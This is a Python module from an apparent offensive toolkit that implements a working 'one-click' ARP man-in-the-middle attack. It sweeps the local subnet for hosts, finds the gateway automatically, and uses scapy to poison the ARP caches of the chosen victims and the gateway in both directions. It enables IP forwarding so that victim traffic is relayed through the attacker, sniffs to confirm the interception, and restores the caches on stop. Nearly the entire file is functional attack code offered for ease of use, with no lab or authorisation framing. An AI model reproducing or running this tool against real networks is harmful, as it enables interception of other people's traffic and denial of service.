"""One-click ARP man-in-the-middle — discover, pick, poison, relay, restore.

Built to be easy: point it at an interface, discover the hosts on the segment,
pick one or more victims (the gateway is found automatically), and it poisons
both directions, turns on IP forwarding so the victims keep connectivity, keeps
the poison fresh, counts traffic actually being relayed through us (so you can
SEE it working), and restores every cache cleanly on stop.

Everything that does not need root/live network is a pure function so it is
unit-tested: default-gateway parsing, subnet expansion, the exact poison/restore
packets for a target set. The live loop is thin glue on top.
"""

from __future__ import annotations

import ipaddress
import logging
import subprocess
import threading
import time

from reforge.attacks.arp_spoof import enable_ip_forward, poison_packet, restore_packet

log = logging.getLogger("reforge.arpmitm")


# ---- pure helpers (unit-tested) --------------------------------------------
def parse_default_gateway(route_text: str) -> str | None:
    """Extract the default-gateway IP from `ip route` output."""
    for line in route_text.splitlines():
        parts = line.split()
        if parts[:2] == ["default", "via"] and len(parts) >= 3:
            return parts[2]
    return None


def subnet_hosts(ip: str, prefixlen: int, cap: int = 1024) -> list[str]:
    """Usable host IPs of the subnet containing `ip/prefixlen` (excludes ip itself)."""
    net = ipaddress.ip_network(f"{ip}/{prefixlen}", strict=False)
    hosts = [str(h) for h in net.hosts() if str(h) != ip]
    return hosts[:cap]


class ArpMitm:
    """Poison one or more victims <-> the gateway and relay their traffic."""

    def __init__(self, iface: str, victims: list[str], gateway: str | None = None,
                 interval: float = 2.0, forward: bool = True):
        self.iface = iface
        self.victims = list(dict.fromkeys(v for v in victims if v))  # de-dupe, keep order
        self.gateway = gateway
        self.interval = interval
        self.forward = forward
        self.our_mac: str | None = None
        self.our_ip: str | None = None
        self.gateway_mac: str | None = None
        self.victim_macs: dict[str, str] = {}
        self.forwarding_on = False
        self.warnings: list[str] = []
        self.sent = 0
        self.relayed = 0
        self._running = threading.Event()
        self._thread: threading.Thread | None = None
        self._sniffer = None

    # ---- pure: the exact frames we send, given resolved MACs ---------------
    def poison_batch(self) -> list:
        """One round of poison frames for every resolved victim (both directions)."""
        out = []
        if not (self.our_mac and self.gateway and self.gateway_mac):
            return out
        for v in self.victims:
            vmac = self.victim_macs.get(v)
            if not vmac:
                continue
            # tell the victim the gateway is at our MAC
            out.append(poison_packet(v, vmac, self.gateway, self.our_mac))
            # tell the gateway the victim is at our MAC
            out.append(poison_packet(self.gateway, self.gateway_mac, v, self.our_mac))
        return out

    def restore_batch(self) -> list:
        out = []
        if not (self.gateway and self.gateway_mac):
            return out
        for v in self.victims:
            vmac = self.victim_macs.get(v)
            if not vmac:
                continue
            out.append(restore_packet(v, vmac, self.gateway, self.gateway_mac))
            out.append(restore_packet(self.gateway, self.gateway_mac, v, vmac))
        return out

    def active_targets(self) -> list[str]:
        return [v for v in self.victims if self.victim_macs.get(v)]

    def status(self) -> dict:
        return {
            "running": self._running.is_set(),
            "gateway": self.gateway,
            "targets": self.active_targets(),
            "unresolved": [v for v in self.victims if not self.victim_macs.get(v)],
            "forwarding_on": self.forwarding_on,
            "sent": self.sent,
            "relayed": self.relayed,
            "warnings": list(self.warnings),
        }

    # ---- live glue (needs root/network) ------------------------------------
    def prepare(self) -> bool:  # pragma: no cover
        from scapy.all import get_if_addr, get_if_hwaddr
        from scapy.layers.l2 import getmacbyip

        self.our_mac = get_if_hwaddr(self.iface)
        try:
            self.our_ip = get_if_addr(self.iface)
        except Exception:
            self.our_ip = None
        if self.gateway is None:
            self.gateway = default_gateway(self.iface)
            if self.gateway:
                self.warnings.append(f"gateway auto-detected: {self.gateway}")
        if not self.gateway:
            self.warnings.append("no gateway found — set it manually")
            return False
        self.gateway_mac = getmacbyip(self.gateway)
        if not self.gateway_mac:
            self.warnings.append(f"could not resolve gateway {self.gateway} MAC")
            return False
        for v in self.victims:
            mac = getmacbyip(v)
            if mac:
                self.victim_macs[v] = mac
            else:
                self.warnings.append(f"could not resolve {v} — skipped")
        if not self.active_targets():
            self.warnings.append("no victims resolved")
            return False
        if self.forward:
            enable_ip_forward(True)
            self.forwarding_on = _ip_forward_enabled()
            if not self.forwarding_on:
                self.warnings.append("IP forwarding is OFF — victims will lose "
                                     "connectivity (this becomes a DoS). Run as root.")
        return True

    def start(self) -> bool:  # pragma: no cover
        if not self.prepare():
            return False
        self._running.set()
        self._thread = threading.Thread(target=self._loop, name="reforge-arpmitm", daemon=True)
        self._thread.start()
        self._start_relay_counter()
        log.info("ARP MITM on %s: %s <-> %s", self.iface,
                 ", ".join(self.active_targets()), self.gateway)
        return True

    def _loop(self) -> None:  # pragma: no cover
        from scapy.sendrecv import sendp

        while self._running.is_set():
            batch = self.poison_batch()
            if batch:
                sendp(batch, iface=self.iface, verbose=False)
                self.sent += len(batch)
            time.sleep(self.interval)

    def _start_relay_counter(self) -> None:  # pragma: no cover
        """Count frames routed THROUGH us (dst MAC = ours, IP dst != ours) — proof it works."""
        try:
            from scapy.sendrecv import AsyncSniffer

            our_mac = (self.our_mac or "").lower()
            our_ip = self.our_ip

            def seen(pkt):
                try:
                    if (pkt.dst.lower() == our_mac and pkt.haslayer("IP")
                            and pkt["IP"].dst != our_ip):
                        self.relayed += 1
                except Exception:
                    pass

            self._sniffer = AsyncSniffer(iface=self.iface, prn=seen, store=False,
                                         filter="ip")
            self._sniffer.start()
        except Exception:
            self._sniffer = None

    def stop(self) -> None:  # pragma: no cover
        self._running.clear()
        if self._thread:
            self._thread.join(timeout=2.0)
        if self._sniffer is not None:
            try:
                self._sniffer.stop()
            except Exception:
                pass
            self._sniffer = None
        from scapy.sendrecv import sendp

        batch = self.restore_batch()
        for _ in range(3):
            if batch:
                sendp(batch, iface=self.iface, verbose=False)
        if self.forwarding_on:
            enable_ip_forward(False)
            self.forwarding_on = False


# ---- live discovery (needs root/network) -----------------------------------
def local_prefixlen(iface: str) -> int:  # pragma: no cover
    try:
        out = subprocess.run(["ip", "-o", "-f", "inet", "addr", "show", iface],
                             capture_output=True, text=True, check=False).stdout
        for tok in out.split():
            if "/" in tok and tok.count(".") == 3:
                return int(tok.split("/")[1])
    except Exception:
        pass
    return 24


def default_gateway(iface: str | None = None) -> str | None:  # pragma: no cover
    args = ["ip", "route", "show", "default"]
    if iface:
        args += ["dev", iface]
    try:
        out = subprocess.run(args, capture_output=True, text=True, check=False).stdout
        gw = parse_default_gateway(out)
        if gw:
            return gw
        # fall back to any default
        out = subprocess.run(["ip", "route", "show", "default"],
                             capture_output=True, text=True, check=False).stdout
        return parse_default_gateway(out)
    except Exception:
        return None


def discover_hosts(iface: str, timeout: float = 2.0) -> list[tuple[str, str]]:  # pragma: no cover
    """ARP-scan the interface's subnet; return [(ip, mac), ...] sorted by IP."""
    from scapy.all import get_if_addr

    from reforge.scan.discovery import arp_sweep, default_arp_prober

    ip = get_if_addr(iface)
    hosts = subnet_hosts(ip, local_prefixlen(iface))
    alive = arp_sweep(hosts, default_arp_prober(iface, timeout=timeout))
    return sorted(alive.items(), key=lambda kv: ipaddress.ip_address(kv[0]))


def _ip_forward_enabled() -> bool:  # pragma: no cover
    try:
        return open("/proc/sys/net/ipv4/ip_forward").read().strip() == "1"
    except Exception:
        return False
